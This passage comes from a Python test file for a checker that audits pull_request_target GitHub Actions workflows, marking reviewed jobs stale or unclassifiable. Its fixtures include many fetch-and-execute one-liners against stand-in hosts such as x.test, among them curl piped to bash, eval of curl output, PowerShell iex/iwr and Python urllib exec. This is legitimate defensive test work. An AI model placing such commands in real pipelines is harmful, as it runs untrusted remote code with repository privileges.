    with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: full-checkout: TOOL_DIR is set by the reviewed base workflow\n"),
    0,
    ("REVIEWED", "dynamic: full-checkout: TOOL_DIR is set by the reviewed base workflow"),
    "a dynamic: justification classifies a job whose on-disk bytes cannot be bounded",
    *REVIEWED_ARGS,
)
expect(
    with_review(SCRIPT_JOB, SCRIPT_ROW.rstrip("\n") + "\tdynamic: fetch: not needed\n"),
    1,
    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: fetch"),
    "a dynamic: justification on a fully resolvable job is stale",
    *REVIEWED_ARGS,
)


DATA_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  path: .source
                  sparse-checkout: config/policy.json
              - run: jq -e .allow .source/config/policy.json
    """,
    "config/policy.json": '{"allow": false}\n',
}
DATA_ROW = review_row(DATA_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review({**DATA_JOB, "config/policy.json": '{"allow": true}\n'}, DATA_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a file the reviewed job sparse-checks-out turns its entry stale",
    *REVIEWED_ARGS,
)
NESTED_JOB = {**SCRIPT_JOB, "scripts/tool.sh": "#!/usr/bin/env bash\nbash scripts/inner.sh\n",
              "scripts/inner.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n"}
NESTED_ROW = review_row(NESTED_JOB, "target.yml [pull_request_target]", "review")
expect(
    with_review({**NESTED_JOB, "scripts/inner.sh": "#!/usr/bin/env bash\ncurl -sSL https://example.test/x | sh\n"}, NESTED_ROW),
    1,
    ("STALE REVIEWED", "content changed"),
    "editing a script that a reviewed job's script runs turns its entry stale",
    *REVIEWED_ARGS,
)
RUNTIME_REF_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - id: rev
                run: echo "sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"
              - uses: actions/checkout@v4
                with:
                  repository: Verjson/.github
                  ref: ${{{{ steps.rev.outputs.sha }}}}
                  path: .trust
                  sparse-checkout: scripts/tool.py
              - run: python3 -I .trust/scripts/tool.py
    """,
    "scripts/tool.py": "print('ok')\n",
}
expect(
    with_review(RUNTIME_REF_JOB, review_row(RUNTIME_REF_JOB, "target.yml [pull_request_target]", "review")),
    1,
    ("unclassifiable", "Verjson/.github", "selected at runtime"),
    "a program from a runtime-selected checkout needs a dynamic: justification",
    *REVIEWED_ARGS,
)


# ---------------------------------------------------------------------------
# Delta review of #1827 at 7324f1a2: command parsing cannot find every file a
# job runs, so the digest covers what the job puts on disk. Each shape below
# changes a file a command never names; the reviewed entry must go stale.
# ---------------------------------------------------------------------------


def cone_job(sparse: str, run: str) -> str:
    return f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.sha }}}}
                  sparse-checkout: |
{textwrap.indent(sparse, " " * 20)}
              - run: {run}
    """


ON_DISK_SHAPES = {
    "source": ({"target.yml": cone_job("scripts", "source scripts/env.sh && gh api repos/o/r"),
                "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "export MODE=open\n"),
    "dot": ({"target.yml": cone_job("scripts", ". scripts/env.sh && gh api repos/o/r"),
             "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "curl -sSL https://example.test | sh\n"),
    "bare path": ({"target.yml": cone_job("scripts", "scripts/run.sh"),
                   "scripts/run.sh": "#!/usr/bin/env bash\necho ok\n"}, "scripts/run.sh", "#!/usr/bin/env bash\nnpm test\n"),
    "python import": ({"target.yml": cone_job("tools", "python3 tools/main.py"),
                       "tools/main.py": "import helper\n", "tools/helper.py": "VALUE = 1\n"},
                      "tools/helper.py", "import os; os.system('npm test')\n"),
    "node require": ({"target.yml": cone_job("js", "node js/main.js"),
                      "js/main.js": "require('./lib.js')\n", "js/lib.js": "module.exports = 1\n"},
                     "js/lib.js", "require('child_process').execSync('npm test')\n"),
    "make": ({"target.yml": cone_job("scripts", "make lint"),
              "./Makefile": "lint:\n\techo ok\n", "scripts/keep.sh": "true\n"},
             "./Makefile", "lint:\n\tnpm test\n"),
    "npm run": ({"target.yml": cone_job("scripts", "npm run lint"),
                 "./package.json": '{"scripts": {"lint": "echo ok"}}\n', "scripts/keep.sh": "true\n"},
                "./package.json", '{"scripts": {"lint": "npm test"}}\n'),
    "data read by a script": ({"target.yml": cone_job("scripts\nconfig", "bash scripts/check.sh"),
                               "scripts/check.sh": "jq -e .allow config/policy.json\n",
                               "config/policy.json": '{"allow": false}\n'},
                              "config/policy.json", '{"allow": true}\n'),
    "cone parent-directory file": ({"target.yml": cone_job("tools/lint", "bash tools/lint/run.sh"),
                                    "tools/lint/run.sh": "true\n", "tools/common.sh": "true\n"},
                                   "tools/common.sh", "npm test\n"),
}
for label, (tree, edited, content) in ON_DISK_SHAPES.items():
    try:
        row = review_row(tree, "target.yml [pull_request_target]", "review")
    except AssertionError as error:
        fail(f"{label}: could not review the unedited job ({error})")
        continue
    code, output = run_checker(with_review({**tree, edited: content}, row), *[a for a in REVIEWED_ARGS])
    if code == 1 and "STALE REVIEWED" in output:
        ok(f"{label}: editing {edited}, which the job has on disk, turns the reviewed entry stale")
    else:
        fail(f"{label}: editing {edited} left the reviewed entry valid (exit {code}: {output.strip()[:300]})")

FULL_CHECKOUT = target_job("""
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.sha }}
    - run: make test
""")
FULL_ROW = review_row(FULL_CHECKOUT, "target.yml [pull_request_target]", "review")
expect(
    with_review(FULL_CHECKOUT, FULL_ROW),
    1,
    ("unclassifiable", "full checkout of the scanned tree"),
    "a full checkout of the scanned tree needs a dynamic: justification",
    *REVIEWED_ARGS,
)
RUNTIME_SPARSE = target_job("""
    - uses: actions/checkout@v4
      with:
        sparse-checkout: scripts
    - run: git sparse-checkout add tools && bash tools/run.sh
""")
expect(
    with_review(RUNTIME_SPARSE, review_row(RUNTIME_SPARSE, "target.yml [pull_request_target]", "review")),
    1,
    ("unclassifiable", "git sparse-checkout"),
    "a runtime git sparse-checkout change needs a dynamic: justification",
    *REVIEWED_ARGS,
)


# A local action binds the review even when the checkout itself is only
# justified as dynamic: its directory, nested local actions, and files it
# reaches through github.action_path stay in the digest.
DYNAMIC_ACTION_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.sha }}}}
              - uses: ./.github/actions/x
    """,
    ".github/actions/x/action.yml": """
        name: x
        runs:
          using: composite
          steps:
            - uses: ./.github/actions/y
            - shell: bash
              run: bash "${{ github.action_path }}/../shared/run.sh"
    """,
    ".github/actions/y/action.yml": """
        name: y
        runs:
          using: composite
          steps:
            - shell: bash
              run: echo y
    """,
    ".github/actions/shared/run.sh": "echo shared\n",
}
DYNAMIC_ACTION_ROW = review_row(DYNAMIC_ACTION_JOB, "target.yml [pull_request_target]", "review").rstrip("\n") + (
    "\tdynamic: full-checkout: the full base checkout is justified for the fixture\n"
)
expect(
    with_review(DYNAMIC_ACTION_JOB, DYNAMIC_ACTION_ROW),
    0,
    ("REVIEWED",),
    "a dynamic full checkout using unchanged local actions passes",
    *REVIEWED_ARGS,
)
for edited, content, label in (
    (".github/actions/x/action.yml", DYNAMIC_ACTION_JOB[".github/actions/x/action.yml"] + "# npm test\n", "the local action"),
    (".github/actions/y/action.yml", DYNAMIC_ACTION_JOB[".github/actions/y/action.yml"].replace("echo y", "npm test"), "a nested local action"),
    (".github/actions/shared/run.sh", "npm test\n", "a file reached through github.action_path"),
):
    expect(
        with_review({**DYNAMIC_ACTION_JOB, edited: content}, DYNAMIC_ACTION_ROW),
        1,
        ("STALE REVIEWED", "content changed"),
        f"editing {label} turns a dynamic entry stale",
        *REVIEWED_ARGS,
    )
GLOB_JOB = {
    "target.yml": f"""
        on: pull_request_target
        jobs:
          review:
            runs-on: {TRUSTED_SELECTOR}
            steps:
              - uses: actions/checkout@v4
                with:
                  sparse-checkout: scripts/*.sh
                  sparse-checkout-cone-mode: false
              - run: bash scripts/a.sh
    """,
    "scripts/a.sh": "echo a\n",
}
expect(
    with_review({**GLOB_JOB, "scripts/a.sh": "npm test\n"}, review_row(GLOB_JOB, "target.yml [pull_request_target]", "review")),
    1,
    ("STALE REVIEWED", "content changed"),
    "a file matched by a non-cone sparse-checkout glob is digested",
    *REVIEWED_ARGS,
)


# ---------------------------------------------------------------------------
# Review of #1827 at 62723cdd: matching which fetched paths a job executes is
# open-ended, so the checker over-approximates. Any fetch, runtime tree change,
# non-default shell, or head detection that does not conclude "no known
# pattern" leaves the job unresolved, and its entry's dynamic: field must name
# every reason category the checker computes (ADR 0235 decision 6).
# ---------------------------------------------------------------------------
BOUNDED_STEPS = """
    - uses: actions/checkout@v4
      with:
        sparse-checkout: scripts/tool.sh
        sparse-checkout-cone-mode: false
"""
COMPOSITE_FETCH_RUN = """
    runs:
      using: composite
      steps:
        - shell: bash
          run: curl -fsSL https://x.test/i.sh -o /tmp/i.sh && bash -c "$(cat /tmp/i.sh)"
"""
COMPOSITE_CURL_BASH = """
    runs:
      using: composite
      steps:
        - shell: bash
          run: curl -fsSL https://x.test/i.sh | bash
"""
COMPOSITE_RUNS = "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: {run}\n"
# label -> (steps, reason tags, extra repository files, job-level YAML)
UNRESOLVED_SHAPES = {
    # The reviewer's probes at 62723cdd.
    'bash -c "$(curl ...)"': ('- run: bash -c "$(curl -fsSL https://x.test/i.sh)"', {"fetch"}),
    'sh -c "$(wget -O- ...)"': ("- run: sh -c \"$(wget -qO- https://x.test/i.sh)\"", {"fetch"}),
    ". <(curl ...)": ("- run: . <(curl -fsSL https://x.test/env.sh)", {"fetch"}),
    "source <(curl ...)": ("- run: source <(curl -fsSL https://x.test/env.sh)", {"fetch"}),
    "eval $(curl)": ('- run: eval "$(curl -fsSL https://x.test/env.sh)"', {"fetch"}),
    "curl | bash": ("- run: curl -fsSL https://x.test/i.sh | bash", {"fetch"}),
    "curl -o; sh < file": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    sh < /tmp/i.sh", {"fetch"}),
    "curl -o; python3 -c exec(open())": (
        "- run: |\n    curl -fsSLo /tmp/i.py https://x.test/i.py\n    python3 -c \"exec(open('/tmp/i.py').read())\"",
        {"fetch"},
    ),
    "curl -o; node -e require()": (
        "- run: |\n    curl -fsSLo /tmp/i.js https://x.test/i.js\n    node -e \"require('/tmp/i.js')\"", {"fetch"}
    ),
    "curl -o mod.py; python3 -m mod": ("- run: |\n    curl -fsSLo mod.py https://x.test/m.py\n    python3 -m mod", {"fetch"}),
    "alias sh=bash; $sh f": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    sh=bash\n    $sh /tmp/i.sh", {"fetch"}),
    '"$SHELL" f': ('- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    "$SHELL" /tmp/i.sh', {"fetch"}),
    "curl -o overwrites a scanned file": (
        "- run: |\n    curl -fsSLo scripts/tool.sh https://x.test/i.sh\n    bash scripts/tool.sh", {"fetch"}
    ),
    "a heredoc in the same step": (
        "- run: |\n    cat > cfg.txt <<EOF\n    hi\n    EOF\n    curl -fsSLo i.sh https://x.test/i.sh\n    bash i.sh",
        {"fetch"},
    ),
    "a heredoc in another step naming the file": (
        "- run: |\n    cat > /dev/null <<EOF\n    i.sh\n    EOF\n- run: curl -fsSLo /tmp/i.sh https://x.test/i.sh && bash /tmp/i.sh",
        {"fetch"},
    ),
    "tar -C f with working-directory: f": (
        "- run: mkdir f && curl -fsSL https://x.test/t.tgz | tar xz -C f\n- run: bash scripts/tool.sh\n  working-directory: f",
        {"fetch"},
    ),
    "python urllib exec": (
        "- run: python3 -c \"import urllib.request as u; exec(u.urlopen('https://x.test/p').read())\"", {"fetch"}
    ),
    "shell: python with urllib": (
        "- shell: python {0}\n  run: |\n    import urllib.request as u\n    exec(u.urlopen('https://x.test/p').read())",
        {"fetch", "shell"},
    ),
    "a shell: override carrying curl | sh": (
        "- shell: \"sh -c 'curl -fsSL https://x.test/i.sh | sh' -- {0}\"\n  run: echo hi", {"fetch", "shell"}
    ),
    "a shell: override alone": ("- shell: sh\n  run: echo hi", {"shell"}),
    "iex (iwr ...) under pwsh": ("- shell: pwsh\n  run: iex (iwr https://x.test/i.ps1).Content", {"fetch", "shell"}),
    "git fetch refs/pull/*/head; git show | bash": (
        "- run: git fetch origin refs/pull/1/head && git show FETCH_HEAD:scripts/tool.sh | bash",
        {"fetch", "head-materialization"},
    ),
    "git fetch refs/pull; git show > f; bash f": (
        "- run: |\n    git fetch origin refs/pull/${{ github.event.pull_request.number }}/head\n"
        "    git show FETCH_HEAD:build.sh > /tmp/b.sh\n    bash /tmp/b.sh",
        {"fetch", "head-materialization"},
    ),
    "gh pr checkout": (
        "- run: gh pr checkout ${{ github.event.pull_request.number }} && bash scripts/tool.sh",
        {"fetch", "tree-change", "head-materialization"},
    ),
    "gh pr diff | git apply": ("- run: gh pr diff 1 | git apply", {"fetch", "tree-change", "head-materialization"}),
    "gh pr diff | patch": ("- run: gh pr diff 1 | patch -p1", {"fetch", "tree-change", "head-materialization"}),
    "git -c k=v apply": ("- run: git -c core.x=1 apply p.diff", {"tree-change"}),
    "git --git-dir checkout FETCH_HEAD": ("- run: git --git-dir=.git checkout FETCH_HEAD -- scripts", {"tree-change"}),
    "git --git-dir with a separate argument": ("- run: git --git-dir .git --work-tree . checkout FETCH_HEAD", {"tree-change"}),
    "npx of a remote package": ("- run: npx --yes evil-pkg@latest", {"fetch"}),
    "pip install git+URL": ("- run: pip install git+https://x.test/evil.git", {"fetch"}),
    "docker run of a fetched image": ("- run: docker run --rm ghcr.io/x/evil:latest", {"fetch"}),
    "download-artifact with path: .": (
        "- uses: actions/download-artifact@v4\n  with:\n    name: tools\n    path: .\n- run: bash scripts/tool.sh",
        {"fetch"},
    ),
    "xargs bash": ("- run: curl -fsSL https://x.test/list | xargs -n1 bash", {"fetch"}),
    "exec bash f": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    exec bash /tmp/i.sh", {"fetch"}),
    "a checkout path: ${{ }} prefix": (
        "- uses: actions/checkout@v4\n  with:\n    path: ${{ github.run_id }}\n    sparse-checkout: scripts/tool.sh\n"
        "    sparse-checkout-cone-mode: false\n- run: |\n    curl -fsSLo dl/scripts/tool.sh https://x.test/i.sh\n"
        "    bash dl/scripts/tool.sh",
        {"fetch"},
    ),
    "defaults.run.working-directory then curl": (
        "- run: curl -fsSL https://x.test/t.tgz | tar xz\n- run: bash scripts/tool.sh",
        {"fetch"},
        {},
        "defaults:\n  run:\n    working-directory: pkg\n",
    ),
    "a local composite action that fetches and runs": (
        "- uses: ./.github/actions/a", {"fetch"}, {".github/actions/a/action.yml": COMPOSITE_FETCH_RUN}
    ),
    "a local composite action running curl | bash": (
        "- uses: ./.github/actions/a", {"fetch"}, {".github/actions/a/action.yml": COMPOSITE_CURL_BASH}
    ),
    "a YAML anchor duplicating a run": ("- &s\n  run: echo hi\n- run: curl -fsSL https://x.test/i.sh | bash", {"fetch"}),
    "an arithmetic shift beside a fetch": (
        "- run: |\n    echo $((1<<n))\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    bash /tmp/i.sh", {"fetch"}
    ),
    "python3 <<EOF executing a fetched file": (
        "- run: |\n    curl -fsSLo /tmp/i.py https://x.test/i.py\n    python3 <<EOF\n    exec(open('/tmp/i.py').read())\n    EOF",
        {"fetch"},
    ),
    # Global options before a subcommand, and other fetch families.
    "git --work-tree with any subcommand": ("- run: git --work-tree=. stash pop", {"tree-change"}),
    "git --no-pager checkout": ("- run: git --no-pager checkout main", {"tree-change"}),
    "git --no-pager fetch": ("- run: git --no-pager fetch origin", {"fetch"}),
    "npm ci": ("- run: npm ci", {"fetch"}),
    "go install": ("- run: go install example.test/tool@latest", {"fetch"}),
    "apt-get install": ("- run: sudo apt-get install -y jq", {"fetch"}),
    "python urllib urlretrieve": ("- run: python3 -c \"import urllib.request; urllib.request.urlretrieve('https://x.test/t', 't')\"", {"fetch"}),
    "python requests": ("- run: python3 -c \"import requests; open('t', 'wb').write(requests.get('https://x.test').content)\"", {"fetch"}),
    "python httpx": ("- run: python3 -c \"import httpx; print(httpx.get('https://x.test').text)\"", {"fetch"}),
    "python http.client": ("- run: python3 -c \"import http.client; http.client.HTTPSConnection('x.test')\"", {"fetch"}),
    "node https.get": ("- run: node -e \"const https = require('https'); https.get('https://x.test')\"", {"fetch"}),
    "node https.get through require": ("- run: node -e \"require('node:https').get('https://x.test')\"", {"fetch"}),
    "urlopen re-exported by another module": ("- run: python3 -c \"from netutil import urlopen; urlopen('https://x.test')\"", {"fetch"}),
    "https.get from follow-redirects": (
        "- run: node -e \"const { https } = require('follow-redirects'); https.get('https://x.test')\"", {"fetch"}
    ),
    "node axios": ("- run: node -e \"require('axios')('https://x.test')\"", {"fetch"}),
    "a repository program calling gh through an argv list": (
        "- run: python3 scripts/tool.sh",
        {"fetch"},
        {"scripts/tool.sh": 'import subprocess\nsubprocess.run(["gh", "release", "download", "v1"])\n'},
    ),
    "node -e fetch()": ("- run: node -e \"fetch('https://x.test').then(r => r.text()).then(eval)\"", {"fetch"}),
    # Local actions and sparse paths the scanned tree cannot bound.
    "a local action script that is missing": (
        "- uses: ./.github/actions/m",
        {"unscanned-path"},
        {".github/actions/m/action.yml": COMPOSITE_RUNS.format(run='bash "${{ github.action_path }}/missing.sh"')},
    ),
    "a local action script outside the tree": (
        "- uses: ./.github/actions/o",
        {"unscanned-path"},
        {".github/actions/o/action.yml": COMPOSITE_RUNS.format(run='bash "${{ github.action_path }}/../../../../outside.sh"')},
    ),
    "a non-cone sparse glob matching nothing": (
        "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: nothing/*.sh\n    sparse-checkout-cone-mode: false",
        {"unscanned-path"},
    ),
    "a local action not in the tree": ("- uses: ./.github/actions/absent", {"local-action"}),
    "local actions nested too deep": (
        "- uses: ./.github/actions/n1",
        {"local-action"},
        {f".github/actions/n{level}/action.yml": f"runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/n{level + 1}\n"
         for level in range(1, 5)},
    ),
    "a local action without a runs block": ("- uses: ./.github/actions/r", {"local-action"}, {".github/actions/r/action.yml": "name: r\n"}),
    "a local action manifest that does not parse": (
        "- uses: ./.github/actions/u", {"local-action"}, {".github/actions/u/action.yml": "runs: [\n"}
    ),
    # Earlier residual shapes, now reason-tagged.
    "git apply": ("- run: git apply change.patch", {"tree-change"}),
    "git am": ("- run: git am < series.mbox", {"tree-change"}),
    "git cherry-pick": ("- run: git cherry-pick abc1234", {"tree-change"}),
    "patch": ("- run: patch -p1 < change.patch", {"tree-change"}),
    "submodules": (
        "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: scripts/tool.sh\n"
        "    sparse-checkout-cone-mode: false\n    submodules: recursive",
        {"submodules"},
    ),
    "gh api contents sourced": (
        "- run: gh api repos/o/r/contents/env.sh --jq .content | base64 -d | tee env.sh\n- run: source ./env.sh",
        {"fetch"},
    ),
    "gh api tarball": ("- run: gh api repos/o/r/tarball/main | tar xz\n- run: bash ./o-r/run.sh", {"fetch"}),
    "gh release download": ("- run: gh release download v1 --pattern tool.sh\n- run: bash tool.sh", {"fetch"}),
    "gh run download": ("- run: gh run download 1 --name tools\n- run: ./tools/run.sh", {"fetch"}),
    "git clone": ("- run: git clone https://example.test/tools.git\n- run: bash tools/run.sh", {"fetch"}),
    "a fetch whose response is only read as data": (
        "- run: curl -sSL https://example.test/status.json | jq .ok\n- run: bash scripts/tool.sh", {"fetch"}
    ),
    "a repository script that fetches": ("- run: bash scripts/tool.sh", {"fetch"}, {"scripts/tool.sh": "gh api repos/o/r\n"}),
    "a repository program fetching through an argv list": (
        "- run: python3 scripts/tool.sh",
        {"fetch"},
        {"scripts/tool.sh": 'import subprocess\nsubprocess.run(["git", "fetch", "origin"])\n'},
    ),
    "actions/cache restores fetched bytes": ("- uses: actions/cache@v4\n  with:\n    path: x\n    key: k", {"fetch"}),
    "actions/cache/restore": ("- uses: actions/cache/restore@v4\n  with:\n    path: x\n    key: k", {"fetch"}),
    "actions/github-script reading repository contents": (
        "- uses: actions/github-script@v7\n  with:\n    script: |\n      await github.rest.repos.getContent({owner: 'o', repo: 'r', path: 'p'})",
        {"fetch"},
    ),
    "a docker:// step": ("- uses: docker://ghcr.io/x/tool@sha256:" + "b" * 64, {"fetch"}),
    "a local docker action": (
        "- uses: ./.github/actions/d",
        {"fetch"},
        {".github/actions/d/action.yml": "runs:\n  using: docker\n  image: Dockerfile\n", ".github/actions/d/Dockerfile": "FROM scratch\n"},
    ),
    "a non-default shell inside a local composite action": (
        "- uses: ./.github/actions/s",
        {"shell"},
        {".github/actions/s/action.yml": "runs:\n  using: composite\n  steps:\n    - shell: python\n      run: print(1)\n"},
    ),
    "a job-level defaults.run.shell": ("- run: echo hi", {"shell"}, {}, "defaults:\n  run:\n    shell: sh\n"),
    "an undetermined head handoff": (
        "- env:\n    CANDIDATE: ${{ github.event.pull_request.head.sha }}\n  run: ./tools/materialize \"$CANDIDATE\"",
        {"head-materialization"},
    ),
    "a head checkout": (
        "- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.event.pull_request.head.sha }}\n"
        "    sparse-checkout: scripts/tool.sh\n    sparse-checkout-cone-mode: false",
        {"runtime-checkout", "head-materialization"},
    ),
}


def shaped_job(steps: str, extra: dict | None = None, job_yaml: str = "") -> dict[str, str]:
    body = textwrap.dedent(BOUNDED_STEPS).strip("\n") + "\n" + textwrap.dedent(steps).strip("\n") + "\n"
    workflow = (
        "on: pull_request_target\njobs:\n  review:\n"
        f"    runs-on: {TRUSTED_SELECTOR}\n"
        + textwrap.indent(job_yaml, "    ")
        + "    steps:\n"
        + textwrap.indent(body, "      ")
    )
    return {"target.yml": workflow, "scripts/tool.sh": "echo ok\n", **(extra or {})}


REASONS = ("fetch", "head-materialization", "tree-change", "shell", "full-checkout", "runtime-checkout",
           "submodules", "unscanned-path", "local-action")


def named_reasons(output: str) -> set[str]:
    """Reason tags an unclassifiable message says the entry's dynamic: lacks."""
    match = re.search(r"unclassifiable: .*?does not name: (.*)", output)
    return {tag for tag in REASONS if match and re.search(rf"(?:^|, ){re.escape(tag)} \(", match.group(1))}


def dynamic_row(row: str, tags, why: str = "bytes come from a reviewed trusted source") -> str:
    return row.rstrip("\n") + f"\tdynamic: {', '.join(sorted(tags))}: {why}\n"


for label, shape in UNRESOLVED_SHAPES.items():
    steps, tags = shape[0], shape[1]
    extra = shape[2] if len(shape) > 2 else None
    job_yaml = shape[3] if len(shape) > 3 else ""
    job = shaped_job(steps, extra, job_yaml)
    try:
        row = review_row(job, "target.yml [pull_request_target]", "review")
    except AssertionError as error:
        fail(f"{label}: could not review the job ({error})")
        continue
    code, output = run_checker(with_review(job, row), *REVIEWED_ARGS)
    computed = named_reasons(output)
    if code == 1 and computed == tags:
        ok(f"{label}: unresolved for {', '.join(sorted(tags))} without dynamic:")
    else:
        fail(f"{label}: expected unresolved {sorted(tags)}, got {sorted(computed)} (exit {code}: {output.strip()[:400]})")
    code, output = run_checker(with_review(job, dynamic_row(row, tags)), *REVIEWED_ARGS)
    if code == 0 and "REVIEWED" in output:
        ok(f"{label}: a dynamic: naming exactly {', '.join(sorted(tags))} classifies it")
    else:
        fail(f"{label}: a correctly tagged dynamic: did not classify it (exit {code}: {output.strip()[:400]})")

# The g-series repros from the 2f48d335 review are unresolved as well as unlisted.
for label, steps in REVIEWER_REPROS.items():
    job = target_job(steps)
    row = review_row(job, "target.yml [pull_request_target]", "review")
    expect(with_review(job, row), 1, ("unclassifiable",), f"{label}: requires a dynamic: justification", *REVIEWED_ARGS)

expect(
    shaped_job("- run: curl -fsSL https://x.test/s.json | jq .ok\n- shell: sh\n  run: echo hi"),
    1,
    ("requires a reviewed entry", "its entry also needs `dynamic: fetch, shell: <justification>` for: fetch (`curl`"),
    "an unlisted job's violation names the dynamic: reasons its entry will need",
)
# The verdict depends on files head detection reads, not only those checked
# out, so the digest binds the computed reasons as well.
HANDOFF = "- env:\n    CANDIDATE: ${{ github.event.pull_request.head.sha }}\n  run: ./tools/materialize \"$CANDIDATE\""
HANDOFF_JOB = shaped_job(HANDOFF, {"tools/materialize": "echo \"$1\"\n"})
expect(
    with_review(
        shaped_job(HANDOFF, {"tools/materialize": "git fetch origin \"$1\" && git checkout FETCH_HEAD\n"}),
        review_row(HANDOFF_JOB, "target.yml [pull_request_target]", "review"),
    ),
    1,
    ("STALE REVIEWED", "newly unresolved reasons dynamic: does not name: head-materialization ("),
    "a program head detection reads that starts materializing the head turns the entry stale",
    *REVIEWED_ARGS,
)
MULTI_REASON = shaped_job("- shell: sh\n  run: curl -fsSL https://x.test/s.json | jq .ok")
MULTI_ROW = review_row(MULTI_REASON, "target.yml [pull_request_target]", "review")
expect(
    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch", "shell"}, "status JSON read as data; sh runs only jq")),
    0,
    ("REVIEWED: target.yml [pull_request_target]: job 'review'", "dynamic: fetch, shell: status JSON read as data"),
    "a dynamic: naming every computed reason classifies the job",
    *REVIEWED_ARGS,
)
expect(
    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch"})),
    1,
    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "does not name: shell ("),
    "a dynamic: missing a computed reason fails and names the missing reason",
    *REVIEWED_ARGS,
)
expect(
    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch", "shell", "submodules"})),
    1,
    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: submodules"),
    "a dynamic: naming a reason the job does not have is stale",
    *REVIEWED_ARGS,
)
for malformed, fragment, label in (
    ("dynamic: fetch, shell: ", "empty justification", "an empty dynamic: justification is rejected"),
    ("dynamic: fetch, shell:", "dynamic: <reason>[, <reason>]: <justification>", "a dynamic: with no justification is rejected"),
    ("dynamic: bytes are fine", "dynamic: <reason>[, <reason>]: <justification>", "an untagged dynamic: is rejected"),
    ("dynamic: fetch, fetchy: why", "unknown dynamic: reason 'fetchy'", "an unknown dynamic: reason is rejected"),
    ("dynamic: fetch, fetch: why", "repeats", "a repeated dynamic: reason is rejected"),
):
    expect(
        with_review(MULTI_REASON, MULTI_ROW.rstrip("\n") + f"\t{malformed}\n"),
        2,
        ("UNDETERMINED", fragment),
        label,
        *REVIEWED_ARGS,
    )

# A reviewed job that gains a reason must say which, not only print digests.
FETCH_JOB = shaped_job("- run: curl -fsSL https://x.test/s.json | jq .ok")
FETCH_ROW = dynamic_row(review_row(FETCH_JOB, "target.yml [pull_request_target]", "review"), {"fetch"})
expect(with_review(FETCH_JOB, FETCH_ROW), 0, ("REVIEWED",), "a fetch-tagged entry passes while unchanged", *REVIEWED_ARGS)
expect(
    with_review(shaped_job("- run: curl -fsSL https://x.test/s.json | jq .ok\n- run: git apply p.diff"), FETCH_ROW),
    1,
    ("STALE REVIEWED", "newly unresolved reasons dynamic: does not name: tree-change (`git apply`"),
    "a reviewed job that gains a reason lists the newly unresolved reason",
    *REVIEWED_ARGS,
)
expect(
    with_review(shaped_job("- run: echo no fetch"), FETCH_ROW),
    1,
    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: fetch"),
    "a reviewed job that loses a reason says which tag to remove",
    *REVIEWED_ARGS,
)

NEAR_MISSES = shaped_job("""- run: |
    # git checkout, curl and "/" in a comment run nothing
    patch="$(jq -r .title event.json)"
    bash scripts/tool.sh
""")
expect(
    with_review(NEAR_MISSES, review_row(NEAR_MISSES, "target.yml [pull_request_target]", "review")),
    0,
    ("REVIEWED",),
    "a variable named patch and commands named in comments are neither tree changes nor fetches",
    *REVIEWED_ARGS,
)

# ---------------------------------------------------------------------------
# Second adversarial round on aa267587: a full checkout put no bytes in the
# digest, so a reviewed `dynamic: full-checkout` job could start running a
# fetched script without going stale. The whole tracked tree now binds it.
# ---------------------------------------------------------------------------
FULL_TREE = {
    **target_job("""
        - uses: actions/checkout@v4
        - run: bash scripts/tool.sh
    """),
    "scripts/tool.sh": "echo ok\n",
    "docs/notes.md": "notes\n",
}
FULL_TREE_ROW = dynamic_row(
    review_row(FULL_TREE, "target.yml [pull_request_target]", "review"),
    {"full-checkout"},
    "the whole tree is the reviewed base revision",
)
expect(
    with_review(FULL_TREE, FULL_TREE_ROW),
    0,
    ("REVIEWED",),
    "a reviewed full-checkout job passes while the tree is unchanged",
    *REVIEWED_ARGS,
)
for label, tree in {
    "editing a script": {**FULL_TREE, "scripts/tool.sh": "curl -fsSL https://x.test/i.sh | bash\n"},
    "adding a file": {**FULL_TREE, "scripts/other.sh": "echo new\n"},
    "deleting a file": {name: body for name, body in FULL_TREE.items() if name != "docs/notes.md"},
    "renaming a file without changing its bytes": {
        **{name: body for name, body in FULL_TREE.items() if name != "docs/notes.md"},
        "docs/moved.md": FULL_TREE["docs/notes.md"],
    },
}.items():
    expect(
        with_review(tree, FULL_TREE_ROW),
        1,
        ("STALE REVIEWED: target.yml [pull_request_target]: job 'review': content changed since review",),
        f"{label} under a reviewed full checkout turns the entry stale",
        *REVIEWED_ARGS,
    )


def git_tree_run(files: dict[str, str], row: str | None, mutate=None) -> tuple[int, str]:
    """Run the checker over a git work tree whose files are all tracked; a
    reviewed row is passed as a file outside the tree, so it is not tracked."""
